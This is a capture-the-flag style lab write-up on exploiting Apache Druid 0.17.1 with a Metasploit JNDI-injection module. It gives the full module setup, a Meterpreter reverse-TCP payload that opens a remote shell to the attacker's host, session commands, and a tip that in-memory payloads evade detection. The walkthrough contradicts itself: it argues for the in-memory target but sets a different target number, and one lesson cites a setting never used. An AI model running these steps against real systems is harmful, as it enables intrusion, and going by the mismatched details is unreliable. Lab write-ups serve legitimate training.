## Module: Using the Metasploit Framework (Section 6 Lab)

---

## Target Information

|Field|Value|
|---|---|
|Target IP|`10.129.30.40`|
|Attacker IP (tun0)|`10.10.14.171`|
|Service|Apache Druid 0.17.1|
|Port|8888|
|CVE|CVE-2023-25194|

---

## Enumeration

### Service Verification

First, confirm the service and version running on the target:

```bash
curl -s http://10.129.30.40:8888/status
```

**Output (relevant):**

```json
{"version":"0.17.1", ...}
```

This confirms Apache Druid version **0.17.1** is running on port **8888**.

---

## Vulnerability Research

Searched for available Metasploit modules:

```bash
msf6 > search apache druid
```

**Results:**

```
0  exploit/linux/http/apache_druid_js_rce          2021-01-21  excellent  Apache Druid 0.20.0 RCE
1    \_ target: Linux (dropper)
2    \_ target: Unix (in-memory)
3  exploit/multi/http/apache_druid_cve_2023_25194  2023-02-07  excellent  Apache Druid JNDI Injection RCE
4    \_ target: Automatic
5    \_ target: Windows
6    \_ target: Linux
```

Although the target runs **0.17.1** (older than 0.20.0), the **CVE-2023-25194 JNDI Injection** module was selected as it targets the JNDI/Log4j attack surface present across multiple Druid versions.

---

## Exploitation

### Module & Payload Configuration

```bash
msf6 > use exploit/multi/http/apache_druid_cve_2023_25194
msf6 > set RHOSTS 10.129.30.40
msf6 > set RPORT 8888
msf6 > set LHOST 10.10.14.171
msf6 > set target 6        # Linux explicit target
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > show options        # verify all parameters
```

### Why Unix (in-memory) over Linux (dropper)?

|Target Mode|Behavior|Issue|
|---|---|---|
|Linux (dropper)|Writes file to disk, executes it|Fails if target dirs not writable or containerized|
|Unix (in-memory)|Executes payload entirely in RAM|More reliable, no disk permissions needed|

Druid commonly runs in containerized environments with restricted filesystem access, making the **in-memory approach** significantly more reliable.

### Execution

```bash
msf6 > run
```

**Output:**

```
[*] Started reverse TCP handler on 10.10.14.171:4444
[-] Failed to handle LDAP request due to Unsupported object type: id=80
[+] The target is vulnerable. Successfully verified code execution on the target
[+] Delivering the serialized Java object to execute the payload...
[*] Server stopped.
[-] Exploit aborted due to failure: unexpected-reply (...)
[*] Meterpreter session 1 opened (10.10.14.171:4444 -> 10.129.30.40:52932)
```

> Note: Despite the `unexpected-reply` warning, the session opened successfully. The LDAP `id=80` error is a known non-fatal quirk with this Druid version's Java deserialization — the in-memory payload still delivers correctly.

---

## Post-Exploitation

### Session Interaction

```bash
msf6 > sessions -l         # list active sessions
msf6 > sessions -i 1       # interact with session 1
```

### Flag Recovery

```bash
meterpreter > search -f flag.txt
# or
meterpreter > shell
$ find / -name flag.txt 2>/dev/null
```

---

## Lessons Learned

1. **Version mismatch doesn't always mean the exploit won't work** — JNDI injection vulnerabilities can span across multiple versions of the same application.
2. **In-memory payloads are preferred for Java applications** running in containerized or restricted environments — no disk writes means no permission issues and harder detection.
3. **Non-fatal errors during exploitation don't mean failure** — the `unexpected-reply` message appeared alongside a successful session, so always wait for the full output before concluding.
4. **Always verify the service version first** (`curl /status`) before selecting a module — it narrows down candidates and informs target selection.
5. **`set SSL false`** is worth trying early when getting SSL connection errors against non-HTTPS services.

---

## Tags

`#metasploit` `#apache-druid` `#jndi-injection` `#rce` `#cve-2023-25194` `#linux` `#in-memory-payload` `#java-deserialization`